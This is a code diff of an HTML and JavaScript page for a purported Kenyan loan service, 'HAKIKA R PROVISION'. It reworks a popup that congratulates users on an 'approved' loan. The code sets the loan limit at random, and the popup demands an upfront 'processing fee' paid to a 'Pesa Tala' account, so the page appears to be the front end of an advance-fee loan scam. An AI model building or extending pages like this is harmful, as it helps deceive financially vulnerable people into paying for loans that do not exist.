@@ -30,20 +30,18 @@
     </button>
   </div>
 
-  <!-- Final Combined Popup -->
+  <!-- Combined Popup -->
   <div id="popupOverlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
     <div class="bg-white text-purple-900 rounded-2xl p-6 w-11/12 max-w-sm text-center shadow-xl">
-      <h2 class="text-2xl font-bold mb-2">🎉 Congratulations, <span id="popupName">User</span>!</h2>
-      <p class="text-sm mb-3">Your loan of <span class="font-bold text-purple-700" id="popupLoan">Ksh ...</span> has been approved.</p>
-      <p class="text-sm mb-2">Processing Fee: <span class="font-bold text-purple-700" id="popupFee">Ksh ...</span></p>
-      <p class="text-sm mb-4">Repayment Period: <strong>14 Days</strong></p>
-
-      <p class="text-sm mb-4">
-        To proceed, <strong>HAKIKA R PROVISION</strong> requires you to make a one-time processing fee payment of
-        <span class="font-bold text-purple-700" id="popupFee">Ksh ...</span> for your approved loan of
-        <span class="font-bold text-purple-700" id="popupLoan">Ksh ...</span> to your <strong>PESA TALA</strong> account below.
+      <h2 class="text-xl font-bold mb-3">✅ Congratulations, <span id="popupName">User</span>!</h2>
+      <p class="text-sm leading-relaxed mb-6">
+        Hi <span id="popupName2">User</span>,<br/>
+        To proceed, <strong>HAKIKA R PROVISION</strong> requires you to make a one-time processing fee payment of 
+        <span class="font-bold text-purple-700" id="popupFee">Ksh ...</span> 
+        for your approved loan of 
+        <span class="font-bold text-purple-700" id="popupLoan">Ksh ...</span> 
+        to your <strong>Pesa Tala</strong> account below.
       </p>
-
       <button onclick="goToVerification()" class="bg-purple-700 hover:bg-purple-800 text-white py-2 px-6 rounded-xl shadow-md transition">
         Proceed to Payment
       </button>
@@ -51,12 +49,10 @@
   </div>
 
   <script>
-    // Fetch name
     const fullName = localStorage.getItem("fullName") || "User";
     const shortName = fullName.split(" ")[0];
     document.getElementById("displayName").textContent = shortName;
 
-    // Generate loan limit and set slider
     const loanLimit = Math.floor(Math.random() * (4500 - 1800 + 1)) + 1800;
     let selectedLoan = loanLimit;
     let processingFee = calcFee(selectedLoan);
@@ -66,7 +62,6 @@
     document.getElementById("loanDisplay").textContent = `Ksh ${selectedLoan.toLocaleString()}`;
     document.getElementById("processingFee").textContent = `Ksh ${processingFee.toLocaleString()}`;
 
-    // Store initial loan values
     localStorage.setItem("loanAmount", selectedLoan);
     localStorage.setItem("processingFee", processingFee);
 
@@ -77,33 +72,22 @@
     function updateLoan(val) {
       selectedLoan = parseInt(val);
       processingFee = calcFee(selectedLoan);
-
       document.getElementById("loanDisplay").textContent = `Ksh ${selectedLoan.toLocaleString()}`;
       document.getElementById("processingFee").textContent = `Ksh ${processingFee.toLocaleString()}`;
-
-      // Store new values
       localStorage.setItem("loanAmount", selectedLoan);
       localStorage.setItem("processingFee", processingFee);
     }
 
     function showFinalPopup() {
       document.getElementById("popupOverlay").classList.remove("hidden");
-
       document.getElementById("popupName").textContent = shortName;
+      document.getElementById("popupName2").textContent = shortName;
       document.getElementById("popupLoan").textContent = `Ksh ${selectedLoan.toLocaleString()}`;
       document.getElementById("popupFee").textContent = `Ksh ${processingFee.toLocaleString()}`;
-      document.getElementById("popupFee2").textContent = `Ksh ${processingFee.toLocaleString()}`;
     }
 
     function goToVerification() {
       window.location.href = "verification.html";
-    }
-
-    function copyTill() {
-      const till = document.getElementById("till").innerText;
-      navigator.clipboard.writeText(till).then(() => {
-        alert("Till number copied: " + till);
-      });
     }
   </script>
 </body>
